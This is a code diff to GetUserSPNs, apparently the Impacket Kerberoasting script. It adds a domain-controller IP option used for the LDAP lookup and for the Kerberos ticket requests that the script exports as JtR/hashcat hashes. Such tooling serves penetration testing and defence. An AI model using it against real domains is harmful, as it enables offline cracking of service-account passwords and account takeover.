@@ -79,6 +79,7 @@ class GetUserSPNs:
         self.__doKerberos = cmdLineOptions.k
         self.__target = None
         self.__requestTGS = options.request
+        self.__kdcHost = cmdLineOptions.dc_ip
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
@@ -91,7 +92,10 @@ class GetUserSPNs:
         self.baseDN = self.baseDN[:-1]
 
     def getMachineName(self):
-        s = SMBConnection(self.__domain, self.__domain)
+        if self.__kdcHost is not None:
+            s = SMBConnection(self.__kdcHost, self.__kdcHost)
+        else:
+            s = SMBConnection(self.__domain, self.__domain)
         try:
             s.login('', '')
         except Exception:
@@ -132,7 +136,8 @@ class GetUserSPNs:
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                 unhexlify(self.__lmhash),
-                                                                unhexlify(self.__nthash), self.__aesKey)
+                                                                unhexlify(self.__nthash), self.__aesKey,
+                                                                kdcHost=self.__kdcHost)
         TGT = {}
         TGT['KDC_REP'] = tgt
         TGT['cipher'] = cipher
@@ -173,7 +178,10 @@ class GetUserSPNs:
         if self.__doKerberos:
             self.__target = self.getMachineName()
         else:
-            self.__target = self.__domain
+            if self.__kdcHost is not None:
+                self.__target = self.__kdcHost
+            else:
+                self.__target = self.__domain
 
         # Connect to LDAP
         ldapConnection = ldap.LDAPConnection('ldap://%s'%self.__target, self.baseDN)
@@ -239,7 +247,8 @@ class GetUserSPNs:
                 for user, SPN in users.iteritems():
                     try:
                         serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None,
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain,
+                                                                                self.__kdcHost,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
                                                                                 TGT['sessionKey'])
                         self.outputTGS(tgs, user, fd)
@@ -266,6 +275,7 @@ if __name__ == '__main__':
     parser.add_argument('-request', action='store_true', default='False', help='Request TGS for users and output them in JtR/hashcat format (default False)')
     parser.add_argument('-outputfile', action='store',
                         help='Output filename to write ciphers in JtR/hashcat format')
+    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use the domain part (FQDN) specified in the target parameter')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     group = parser.add_argument_group('authentication')
